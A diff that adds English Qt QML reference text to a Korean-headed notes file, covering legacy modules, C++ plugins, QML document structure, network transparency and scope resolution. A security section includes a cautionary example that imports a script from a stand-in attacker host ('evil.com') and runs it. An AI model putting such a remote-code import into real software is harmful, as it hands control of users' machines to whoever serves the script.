@@ -38,7 +38,6 @@
     * [C++ 플러그인에서 타입 및 기능 제공하기](#c-플러그인에서-타입-및-기능-제공하기)
   - [QML 문서](#qml-문서)
     * [QML 문서의 구조](#qml-문서의-구조)
-    * [QML 문서를 통한 객체 타입 정의하기](#qml-문서를-통한-객체-타입-정의하기)
     * [리소스 로딩 및 네트워크 투명성](#리소스-로딩-및-네트워크-투명성)
     * [범위 및 네이밍 규칙](#범위-및-네이밍-규칙)
 
@@ -3983,35 +3982,535 @@ import com.example.CustomUi 1.0
 
 ##### 지원되는 QML 모듈 타입 - 레거시(Legacy) 모듈
 
--
+* Legacy Modules
+
+Legacy modules are modules whose specification qmldir file does not contain a module identifier directive. A legacy module may be either installed into the QML import path (as an installed legacy module) or imported by clients with a relative import (as a located legacy module). Clients are advised to avoid using legacy modules if possible. Module developers should ensure they create identified modules and not legacy modules.
+
+* Installed Legacy Modules
+
+An installed, non-identified module is automatically given an identifier by the QML engine. This implicitly defined identifier is equal to the install path of the module (relative to the QML import path) where directory-separator characters are replaced with period characters.
+
+A non-identified module which is installed into the QML import path has the following semantics:
+
+- it may be imported by clients via the implicit module identifier
+- clients must specify a version when importing the module
+- conflicting type names are resolved arbitrarily by the QML engine, and the way in which conflicts are resolved is not guaranteed to stay the same between different versions of QML
+- other legacy modules may modify or override type definitions provided by the installed legacy module
+
+* Located Legacy Modules
+
+A non-identified module which is imported via a relative directory path import statement is loaded by the engine as a located legacy module. The following semantics apply to located legacy modules:
+
+- it may be imported by clients via a relative import path
+- it is not mandatory for clients to specify a version when importing the module
+- if no import version is supplied by the client in the import statement, no guarantees are given by the QML engine about which version of the definition of a given type name will be imported
+- conflicting type names are resolved arbitrarily by the QML engine, and the way in which conflicts are resolved is not guaranteed to stay the same between different versions of QML
+- other legacy modules may modify or override type definitions provided by the located legacy module
+
+A located legacy module may reside on the local file system or on the network and can be referred to by a URL that specifies the file system path or network URL.
 
 
 ##### C++ 플러그인에서 타입 및 기능 제공하기
 
--
+* Creating C++ Plugins for QML
+
+* Creating a Plugin
+
+The QML engine loads C++ plugins for QML. Such plugins are usually provided in a QML extension module, and can provide types for use by clients in QML documents that import the module. A module requires at least one registered type to be considered valid.
+
+QQmlEngineExtensionPlugin is a plugin interface that lets you create QML extensions that can be loaded dynamically into QML applications. These extensions allow custom QML types to be made available to the QML engine.
+
+To write a QML extension plugin:
+
+1. Subclass QQmlEngineExtensionPlugin and use the Q_PLUGIN_METADATA() macro to register the plugin with the Qt meta object system.
+2. Use the QML_ELEMENT and QML_NAMED_ELEMENT() macros to declare QML types.
+3. Configure your build file.
+
+CMake:
+```
+qt_add_qml_module(<target>
+    URI <my.import.name>
+    VERSION 1.0
+    QML_FILES <app.qml>
+    NO_RESOURCE_TARGET_PATH
+)
+```
+
+qmake:
+```
+CONFIG += qmltypes
+QML_IMPORT_NAME = <my.import.name>
+QML_IMPORT_MAJOR_VERSION = <version>
+```
+
+4. If you're using qmake, create a qmldir file to describe the plugin. Note that CMake will, by default, automatically generate the qmldir file.
+
+QML extension plugins are for either application-specific or library-like plugins. Library plugins should limit themselves to registering types, as any manipulation of the engine's root context may cause conflicts or other issues in the library user's code.
+
+Note: When using the CMake qt_add_qml_module API, a plugin will be generated automatically for you. It will take care of type registration. You only need to write a custom plugin if you have special requirements, such as registering custom image providers. In that case, pass NO_GENERATE_PLUGIN_SOURCE to the qt_add_qml_module call to disable the generation of the default plugin.
+
+The linker might erroneously remove the generated type registration function as an optimization. You can prevent that by declaring a synthetic volatile pointer to the function somewhere in your code. If your module is called "my.module", you would add the forward declaration in global scope:
+
+```cpp
+void qml_register_types_my_module();
+```
+
+Then add the following snippet of code in the implementation of any function that's part of the same binary as the registration:
+
+```cpp
+volatile auto registration = &qml_register_types_my_module;
+Q_UNUSED(registration);
+```
+
+Reference
+- Writing QML Extensions with C++ - contains a chapter on creating QML plugins.
+- Defining QML Types from C++ - information about registering C++ types into the runtime.
+- How to Create Qt Plugins - information about Qt plugins
 
 ---
 
 #### QML 문서
 
--
+* QML Documents
+
+A QML document is a string which conforms to QML document syntax. A document defines a QML object type. A document is generally loaded from a ".qml" file stored either locally or remotely, but can be constructed manually in code. An instance of the object type defined by a document may be created using a Component in QML code, or a QQmlComponent in C++. Alternatively, if the object type is explicitly exposed to the QML type system with a particular type name, the type may be used directly in object declarations in other documents.
+
+The ability to define re-usable QML object types in documents is an important enabler to allow clients to write modular, highly readable and maintainable code.
+
+Since Qt 5.4, a document can also have the file extension ".ui.qml". The QML engine handles these files like standard .qml files and ignores the .ui part of the extension. Qt Design Studio handles those files as UI files. The files can contain only a subset of the QML language features.
+
+* Structure of a QML Document
+
+A QML document consists of two sections: the imports section, and the object declaration section. The imports section in a document contains import statements that define which QML object types and JavaScript resources the document is able to use. The object declaration section defines the object tree to be created when instantiating the object type defined by the document.
+
+An example of a simple document is as follows:
+
+```qml
+import QtQuick 2.0
+
+Rectangle {
+    width: 300
+    height: 200
+    color: "blue"
+}
+```
+
+See the Structure of a QML Document for more information on the topic.
+
+* Syntax of the QML Language
+
+The object declaration section of the document must specify a valid object hierarchy with appropriate QML syntax. An object declaration may include the specification of custom object attributes. Object method attributes may be specified as JavaScript functions, and object property attributes may be assigned property binding expressions.
+
+Please see the documentation about the syntax of QML for more information about valid syntax, and see the documentation about integrating QML and JavaScript for in-depth information on that topic.
+
+* Defining Object Types Through QML Documents
+
+As described briefly in the previous section, a document implicitly defines a QML object type. One of the core principles of QML is the ability to define and then re-use object types. This improves the maintainability of QML code, increases the readability of object hierarchy declarations, and promotes separation between UI definition and logic implementation.
+
+In the following example, the client developer defines a Button type with a document in a file:
+
+```qml
+// Button.qml
+import QtQuick 2.0
+
+Rectangle {
+    width: 100; height: 100
+    color: "red"
+
+    MouseArea {
+        anchors.fill: parent
+        onClicked: console.log("Button clicked!")
+    }
+}
+```
+
+The Button type can then be used in an application:
+
+```qml
+// application.qml
+import QtQuick 2.0
+
+Column {
+    Button { width: 50; height: 50 }
+    Button { x: 50; width: 100; height: 50; color: "blue" }
+    Button { width: 50; height: 50; radius: 8 }
+}
+```
+
+Please see the documentation about defining object types in documents for in-depth information on the topic.
+
+* Resource Loading and Network Transparency
+
+It is important to note that QML is network-transparent. Applications can import documents from remote paths just as simply as documents from local paths. In fact, any url property may be assigned a remote or local URL, and the QML engine will handle any network communication involved.
+
+Please see the Network Transparency documentation for more information about network transparency in imports.
+
+* Scope and Naming Resolution
+
+Expressions in documents usually involve objects or properties of objects, and since multiple objects may be defined and since different objects may have properties with the same name, some predefined symbol resolution semantics must be defined by QML. Please see the page on scope and symbol resolution for in-depth information about the topic.
 
 
 ##### QML 문서의 구조
 
--
+* Structure of a QML Document
 
+A QML document is a self contained piece of QML source code that consists of two parts:
 
-##### QML 문서를 통한 객체 타입 정의하기
+- Its import statements
+- A single root object declaration
 
--
+By convention, a single empty line separates the imports from the object hierarchy definition.
+
+QML documents are always encoded in UTF-8 format.
+
+* Imports
+
+A document must import the necessary modules or type namespaces to enable the engine to load the QML object types referenced within the document. By default, a document can access any QML object types that have been defined through .qml files in the same directory; if a document needs to refer to any other object types, it must import the type namespace into which those types have been registered.
+
+QML does not have a preprocessor that modifies the document prior to presentation to the QML engine, unlike C or C++. The import statements do not copy and prepend the code in the document, but instead instruct the QML engine on how to resolve type references found in the document. Any type reference present in a QML document - such as Rectangle and ListView - including those made within a JavaScript block or property bindings, are resolved based exclusively on the import statements. At least one import statement must be present such as import QtQuick 2.0.
+
+Please see the QML Syntax - Import Statements documentation for in-depth information about QML imports.
+
+* The Root Object Declaration
+
+A QML document describes a hierarchy of objects which can be instantiated. Each object definition has a certain structure; it has a type, it can have an id and an object name, it can have properties, it can have methods, it can have signals and it can have signal handlers.
+
+A QML file must only contain a single root object definition. The following is invalid and will generate an error:
+
+```qml
+// MyQmlFile.qml
+import QtQuick 2.0
+
+Rectangle { width: 200; height: 200; color: "red" }
+Rectangle { width: 200; height: 200; color: "blue" }    // invalid!
+```
+
+This is because a .qml file automatically defines a QML type, which encapsulates a single QML object definition. This is discussed further in Documents as QML object type definitions.
 
 
 ##### 리소스 로딩 및 네트워크 투명성
 
--
+Resource Loading and Network Transparency
+QML supports network transparency by using URLs (rather than file names) for all references from a QML document to other content. This means that anywhere a URL source is expected, QML can handle remote resources as well as local ones, for example in the following image source:
+
+```qml
+Image {
+    source: "http://www.example.com/images/logo.png"
+}
+```
+
+Since a relative URL is the same as a relative file, development of QML on regular file systems remains simple:
+
+```qml
+Image {
+    source: "images/logo.png"
+}
+```
+
+Network transparency is supported throughout QML, for example, both the FontLoader and Image elements support loading resources from a remote server.
+
+Even QML types themselves can be on the network: if the qml tool is used to load http://example.com/mystuff/Hello.qml and that content refers to a type "World", the engine will load http://example.com/mystuff/qmldir and resolve the type just as it would for a local file. For example if the qmldir file contains the line "World World.qml", it will load http://example.com/mystuff/World.qml Any other resources that Hello.qml referred to, usually by a relative URL, would similarly be loaded from the network.
+
+* Relative vs. Absolute URLs
+
+Whenever an object has a property of type URL (QUrl), assigning a string to that property will actually assign an absolute URL - by resolving the string against the URL of the document where the string is used.
+
+For example, consider this content in http://example.com/mystuff/test.qml:
+
+```qml
+Image {
+    source: "images/logo.png"
+}
+```
+
+The Image source property will be assigned http://example.com/mystuff/images/logo.png, but while the QML is being developed, in say C:\User\Fred\Documents\MyStuff\test.qml, it will be assigned C:\User\Fred\Documents\MyStuff\images\logo.png.
+
+If the string assigned to a URL is already an absolute URL, then "resolving" does not change it and the URL is assigned directly.
+
+* QRC Resources
+
+One of the URL schemes built into Qt is the "qrc" scheme. This allows content to be compiled into the executable using The Qt Resource System. Using this, an executable can reference QML content that is compiled into the executable:
+
+```cpp
+QQuickView *view = new QQuickView;
+view->setUrl(QUrl("qrc:/dial.qml"));
+```
+
+The content itself can then use relative URLs, and so be transparently unaware that the content is compiled into the executable.
+
+* Limitations
+
+The import statement is only network transparent if it has an "as" clause.
+
+More specifically:
+
+- import "dir" only works on local file systems
+- import libraryUri only works on local file systems
+- import "dir" as D works network transparently
+- import libraryUrl as U works network transparently
+
+* Implications for Application Security
+
+The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.
+
+In order to preserve the trust of users, QML application developers should not load and execute arbitrary JavaScript or QML resources. For example, consider the QML code below:
+
+```qml
+import QtQuick 2.0
+import "http://evil.com/evil.js" as Evil
+
+Component {
+    onLoaded: Evil.doEvil()
+}
+```
+
+This is equivalent to downloading and executing "http://evil.com/evil.exe". The QML engine will not prevent particular resources from being loaded. Unlike JavaScript code that is run within a web browser, a QML application can load remote or local filesystem resources in the same way as any other native applications, so application developers must be careful in loading and executing any content.
+
+As with any application accessing other content beyond its control, a QML application should perform appropriate checks on any untrusted data it loads. Do not, for example, use import, Loader or XMLHttpRequest to load any untrusted code or content.
 
 
 ##### 범위 및 네이밍 규칙
 
--
+* Scope and Naming Resolution
+
+QML property bindings, inline functions, and imported JavaScript files all run in a JavaScript scope. Scope controls which variables an expression can access, and which variable takes precedence when two or more names conflict.
+
+As JavaScript's built-in scope mechanism is very simple, QML enhances it to fit more naturally with the QML language extensions.
+
+* JavaScript Scope
+
+QML's scope extensions do not interfere with JavaScript's natural scoping. JavaScript programmers can reuse their existing knowledge when programming functions, property bindings or imported JavaScript files in QML.
+
+In the following example, the addConstant() method will add 13 to the parameter passed just as the programmer would expect irrespective of the value of the QML object's a and b properties.
+
+```qml
+QtObject {
+    property int a: 3
+    property int b: 9
+
+    function addConstant(b) {
+        var a = 13;
+        return b + a;
+    }
+}
+```
+
+That QML respects JavaScript's normal scoping rules even applies in bindings. This totally evil, abomination of a binding will assign 12 to the QML object's a property.
+
+```qml
+QtObject {
+    property int a
+
+    a: { var a = 12; a; }
+}
+```
+
+Every JavaScript expression, function or file in QML has its own unique variable object. Local variables declared in one will never conflict with local variables declared in another.
+
+* Type Names and Imported JavaScript Files
+
+QML Documents include import statements that define the type names and JavaScript files visible to the document. In addition to their use in the QML declaration itself, type names are used by JavaScript code when accessing attached properties and enumeration values.
+
+The effect of an import applies to every property binding, and JavaScript function in the QML document, even those in nested inline components. The following example shows a simple QML file that accesses some enumeration values and calls an imported JavaScript function.
+
+```qml
+import QtQuick 2.0
+import "code.js" as Code
+
+ListView {
+    snapMode: ListView.SnapToItem
+
+    delegate: Component {
+        Text {
+            elide: Text.ElideMiddle
+            text: "A really, really long string that will require eliding."
+            color: Code.defaultColor()
+        }
+    }
+}
+```
+
+* Binding Scope Object
+
+An object which has a property binding is known as the binding's scope object. In the following example, the Item object is the binding's scope object.
+
+```qml
+Item {
+    anchors.left: parent.left
+}
+```
+
+Bindings have access to the scope object's properties without qualification. In the previous example, the binding accesses the Item's parent property directly, without needing any form of object prefix. QML introduces a more structured, object-oriented approach to JavaScript, and consequently does not require the use of the JavaScript this property.
+
+Care must be used when accessing attached properties from bindings due to their interaction with the scope object. Conceptually attached properties exist on all objects, even if they only have an effect on a subset of those. Consequently unqualified attached property reads will always resolve to an attached property on the scope object, which is not always what the programmer intended.
+
+For example, the PathView type attaches interpolated value properties to its delegates depending on their position in the path. As PathView only meaningfully attaches these properties to the root object in the delegate, any sub-object that accesses them must explicitly qualify the root object, as shown below.
+
+```qml
+PathView {
+    delegate: Component {
+        Rectangle {
+            id: root
+            Image {
+                scale: root.PathView.scale
+            }
+        }
+    }
+}
+```
+
+If the Image object omitted the root prefix, it would inadvertently access the unset PathView.scale attached property on itself.
+
+* Component Scope
+
+Each QML component in a QML document defines a logical scope. Each document has at least one root component, but can also have other inline sub-components. The component scope is the union of the object ids within the component and the component's root object's properties.
+
+```qml
+Item {
+    property string title
+
+    Text {
+        id: titletype
+        text: "<b>" + title + "</b>"
+        font.pixelSize: 22
+        anchors.top: parent.top
+    }
+
+    Text {
+        text: titletype.text
+        font.pixelSize: 18
+        anchors.bottom: parent.bottom
+    }
+}
+```
+
+The example above shows a simple QML component that displays a rich text title string at the top, and a smaller copy of the same text at the bottom. The first Text type directly accesses the component's title property when forming the text to display. That the root type's properties are directly accessible makes it trivial to distribute data throughout the component.
+
+The second Text type uses an id to access the first's text directly. IDs are specified explicitly by the QML programmer so they always take precedence over other property names (except for those in the JavaScript Scope). For example, in the unlikely event that the binding's scope object had a titletype property in the previous example, the titletype id would still take precedence.
+
+* Component Instance Hierarchy
+
+In QML, component instances connect their component scopes together to form a scope hierarchy. Component instances can directly access the component scopes of their ancestors.
+
+The easiest way to demonstrate this is with inline sub-components whose component scopes are implicitly scoped as children of the outer component.
+
+```qml
+Item {
+    property color defaultColor: "blue"
+
+    ListView {
+        delegate: Component {
+            Rectangle {
+                color: defaultColor
+            }
+        }
+    }
+}
+```
+
+The component instance hierarchy allows instances of the delegate component to access the defaultColor property of the Item type. Of course, had the delegate component had a property called defaultColor that would have taken precedence.
+
+The component instance scope hierarchy extends to out-of-line components, too. In the following example, the TitlePage.qml component creates two TitleText instances. Even though the TitleText type is in a separate file, it still has access to the title property when it is used from within the TitlePage. QML is a dynamically scoped language - depending on where it is used, the title property may resolve differently.
+
+```qml
+// TitlePage.qml
+import QtQuick 2.0
+Item {
+    property string title
+
+    TitleText {
+        size: 22
+        anchors.top: parent.top
+    }
+
+    TitleText {
+        size: 18
+        anchors.bottom: parent.bottom
+    }
+}
+
+// TitleText.qml
+import QtQuick 2.0
+Text {
+    property int size
+    text: "<b>" + title + "</b>"
+    font.pixelSize: size
+}
+```
+
+Dynamic scoping is very powerful, but it must be used cautiously to prevent the behavior of QML code from becoming difficult to predict. In general it should only be used in cases where the two components are already tightly coupled in another way. When building reusable components, it is preferable to use property interfaces, like this:
+
+```qml
+// TitlePage.qml
+import QtQuick 2.0
+Item {
+    id: root
+    property string title
+
+    TitleText {
+        title: root.title
+        size: 22
+        anchors.top: parent.top
+    }
+
+    TitleText {
+        title: root.title
+        size: 18
+        anchors.bottom: parent.bottom
+    }
+}
+
+// TitleText.qml
+import QtQuick 2.0
+Text {
+    property string title
+    property int size
+
+    text: "<b>" + title + "</b>"
+    font.pixelSize: size
+}
+```
+
+* Overridden Properties
+
+QML permits property names defined in an object declaration to be overridden by properties declared within another object declaration that extends the first. For example:
+
+```qml
+// Displayable.qml
+import QtQuick 2.0
+Item {
+    property string title
+    property string detail
+
+    Text {
+        text: "<b>" + title + "</b><br>" + detail
+    }
+
+    function getTitle() { return title }
+    function setTitle(newTitle) { title = newTitle }
+}
+
+// Person.qml
+import QtQuick 2.0
+Displayable {
+    property string title
+    property string firstName
+    property string lastName
+
+    function fullName()  { return title + " " + firstName + " " + lastName }
+}
+```
+
+Here, the name title is given to both the heading of the output text for Displayable, and also to the honorific title of the Person object.
+
+An overridden property is resolved according to the scope in which it is referenced. Inside the scope of the Person component, or from an external scope that refers to an instance of the Person component, title resolves to the property declared inside Person.qml. The fullName function will refer to the title property declared inside Person.
+
+Inside the Displayable component, however, title refers to the property declared in Displayable.qml. The getTitle() and setTitle() functions, and the binding for the text property of the Text object will all refer to the title property declared in the Displayable component.
+
+Despite sharing the same name, the two properties are entirely separate. An onChanged signal handler for one of the properties will not be triggered by a change to the other property with the same name. An alias to either property will refer to one or the other, but not both.
+
+* JavaScript Global Object
+
+QML disallows type, id and property names that conflict with the properties on the global object to prevent any confusion. Programmers can be confident that Math.min(10, 9) will always work as expected!
+
+See JavaScript Host Environment for more information.
